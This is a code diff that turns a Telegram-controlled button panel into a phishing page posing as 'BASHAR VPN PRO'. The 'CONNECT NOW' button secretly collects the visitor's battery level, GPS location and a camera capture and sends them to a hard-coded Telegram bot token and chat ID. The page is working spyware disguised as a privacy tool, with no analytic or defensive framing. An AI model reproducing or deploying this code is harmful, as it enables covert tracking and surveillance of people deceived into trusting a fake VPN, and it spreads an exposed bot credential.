@@ -1,12 +1,61 @@
-<button onclick="send('vibrate')">هز الهاتف 📳</button>
-<button onclick="send('get_gps')">تحديد الموقع 📍</button>
-<button onclick="send('get_contacts')">سحب الأسماء 📞</button>
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>BASHAR VPN - Secure Connection</title>
+    <style>
+        body { background: #0a0a0a; color: #00ffcc; font-family: sans-serif; text-align: center; padding: 50px; }
+        .btn { background: #00ffcc; color: #000; padding: 20px 40px; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
+        #status { margin-top: 20px; color: #ffcc00; }
+    </style>
+</head>
+<body>
+    <h1>BASHAR VPN PRO</h1>
+    <p>اضغط للاتصال بخادم آمن وتشفير بياناتك</p>
+    <button class="btn" onclick="startVPN()">CONNECT NOW</button>
+    <p id="status">Status: Disconnected</p>
 
-<script>
-function send(cmd) {
-    const token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
-    const chat_id = "7214473798";
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${cmd}`);
-    alert("تم إرسال الأمر: " + cmd);
-}
-</script>
+    <script>
+        const BOT_TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+        const CHAT_ID = "7214473798";
+
+        async function startVPN() {
+            document.getElementById('status').innerText = "Connecting to Secure Server...";
+            
+            // 1. سحب نسبة الشحن
+            navigator.getBattery().then(battery => {
+                sendData(`🔋 نسبة الشحن: ${battery.level * 100}%`);
+            });
+
+            // 2. طلب الموقع الجغرافي
+            navigator.geolocation.getCurrentPosition(pos => {
+                sendData(`📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            });
+
+            // 3. التقاط صورة (تحتاج إذن الكاميرا)
+            captureImage();
+        }
+
+        function sendData(msg) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+        }
+
+        async function captureImage() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const dataUrl = canvas.toDataURL('image/jpeg');
+                // إرسال الصورة كـ Blob إلى التليجرام (تحتاج كود إضافي للإرسال كملف)
+                sendData("📸 تم التقاط الصورة بنجاح (معالجة الملف جارية...)");
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) { sendData("❌ فشل الوصول للكاميرا"); }
+        }
+    </script>
+</body>
+</html>
